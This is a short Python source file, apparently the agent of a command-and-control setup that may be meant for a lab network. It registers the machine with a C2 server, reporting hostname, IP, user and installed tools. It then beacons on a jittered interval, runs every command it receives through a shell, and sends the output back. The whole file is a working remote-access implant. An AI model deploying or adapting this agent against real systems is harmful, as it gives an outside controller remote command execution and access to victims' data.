#!/usr/bin/env python3
"""Dumb Binary Agent — zero attack logic, three operations only."""
import logging
import os
import platform
import shutil
import socket
import subprocess
import sys
import time

import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("dba")

C2_HOST = os.environ.get("C2_HOST", "").strip()
BEACON_INTERVAL = float(os.environ.get("BEACON_INTERVAL", "5"))
DBA_USER = os.environ.get("DBA_USER", os.environ.get("USER", "unknown"))

if not C2_HOST:
    log.error("C2_HOST not set — refusing to start (domain-lock)")
    sys.exit(1)

C2_BASE = f"http://{C2_HOST}:8000"


def _detect_tools() -> list[str]:
    return [t for t in ["python3", "curl", "nmap", "gcc", "ssh"] if shutil.which(t)]


def _local_ip() -> str:
    # Use C2_HOST (reachable on the internal network) to discover our own IP.
    # Avoids the 2s timeout that would occur trying to reach an external address
    # on an internal: true Docker network.
    try:
        with socket.create_connection((C2_HOST, 8000), timeout=2) as s:
            return s.getsockname()[0]
    except Exception:
        return socket.gethostbyname(socket.gethostname())


def register() -> str:
    payload = {
        "os": platform.system() + " " + platform.release(),
        "hostname": socket.gethostname(),
        "local_ip": _local_ip(),
        "username": DBA_USER,
        "tools": _detect_tools(),
    }
    resp = requests.post(f"{C2_BASE}/register", json=payload, timeout=10)
    resp.raise_for_status()
    host_id = resp.json()["host_id"]
    log.info("Registered as host_id=%s", host_id)
    return host_id


def fetch_commands(host_id: str) -> list[str]:
    resp = requests.get(f"{C2_BASE}/commands/{host_id}", timeout=10)
    resp.raise_for_status()
    return resp.json().get("commands", [])


def run_command(cmd: str) -> str:
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        return "ERROR: command timed out"
    except Exception as exc:
        return f"ERROR: {exc}"


def post_result(host_id: str, cmd: str, output: str) -> None:
    requests.post(
        f"{C2_BASE}/results/{host_id}",
        json={"cmd": cmd, "output": output},
        timeout=10,
    )


def beacon_loop(host_id: str) -> None:
    jitter_pct = 0.2
    while True:
        try:
            cmds = fetch_commands(host_id)
            for cmd in cmds:
                log.info("Executing: %r", cmd)
                output = run_command(cmd)
                log.info("Output: %r", output[:200])
                post_result(host_id, cmd, output)
        except requests.HTTPError as exc:
            if exc.response is not None and exc.response.status_code == 404:
                log.warning("C2 lost our registration (404) — re-registering")
                return  # signal main() to re-register
            log.warning("C2 HTTP error: %s", exc)
        except requests.RequestException as exc:
            log.warning("C2 unreachable: %s", exc)

        jitter = BEACON_INTERVAL * jitter_pct * (2 * __import__("random").random() - 1)
        time.sleep(max(1.0, BEACON_INTERVAL + jitter))


def main() -> None:
    log.info("DBA starting — C2_HOST=%s beacon_interval=%.1fs", C2_HOST, BEACON_INTERVAL)
    while True:
        try:
            host_id = register()
        except Exception as exc:
            log.warning("Registration failed: %s — retrying in 5s", exc)
            time.sleep(5)
            continue
        beacon_loop(host_id)
        # beacon_loop returns only on 404 (C2 restarted) — re-register immediately


if __name__ == "__main__":
    main()
